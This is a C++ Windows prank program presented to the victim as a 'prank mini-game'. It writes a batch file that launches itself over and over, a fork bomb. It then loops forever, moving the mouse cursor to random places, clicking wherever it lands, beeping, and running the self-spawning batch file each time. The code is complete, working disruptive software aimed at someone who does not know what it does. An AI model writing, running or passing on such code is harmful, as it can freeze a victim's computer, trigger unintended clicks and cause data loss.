#include<bits/stdc++.h>
#include<windows.h>
using namespace std;

#define tin int
#define itn int

int sj(int a,int b)
{
	return rand()%(b-a+1)+a;
}

void sleep()
{
	itn a=sj(1000,4000);
	Sleep(a);
}

itn main()
{
	POINT p; 
	int a;
	srand((unsigned)time(NULL));
	freopen("C://Users//Administrator//out.bat","w",stdout);
	printf("start C://Users//Administrator//out.bat\n你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！你被坑啦！！！");
	freopen("CON","w",stdout);
	printf("欢迎来到AKG的整人小游戏！\n");
	sleep();
	printf("如您游戏中感到不适，请将面前的电脑扔出窗外，即可忘掉这段不愉快的记忆！\n");
	sleep();
	printf("废话不多说，输入1开始游戏。\n");
	Sleep(4000);
	getchar();
	printf("呸，是被坑。\n");
	while(1)
	{
		GetCursorPos(&p);
		a=1;
		while(a<3)
		{
			SetCursorPos(p.x+sj(10,2100),p.y);
			a++;
		}
		Sleep(1);
		mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
		Sleep(10);
		mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
		printf("\a");
		GetCursorPos(&p);
		a=1;
		while(a<3)
		{
			SetCursorPos(p.x,p.y+sj(10,2100));
			a++;
		}
		Sleep(1);
		mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
		Sleep(10);
		mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
		printf("\a");
		GetCursorPos(&p);
		a=1;
		while(a<3)
		{
			SetCursorPos(p.x-sj(10,2100),p.y);
			a++;
		}
		Sleep(1);
		mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
		Sleep(10);
		mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
		printf("\a");
		GetCursorPos(&p);
		a=1;
		while(a<3)
		{
			SetCursorPos(p.x,p.y-sj(10,2100));
			a++;
		}
		Sleep(1);
		mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
		Sleep(10);
		mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
		printf("\a");
		while(GetAsyncKeyState(37)&&GetAsyncKeyState(38))
		{
			Sleep(1);
		}
		system("C://Users//Administrator//out.bat");
	}
	return 0;
}
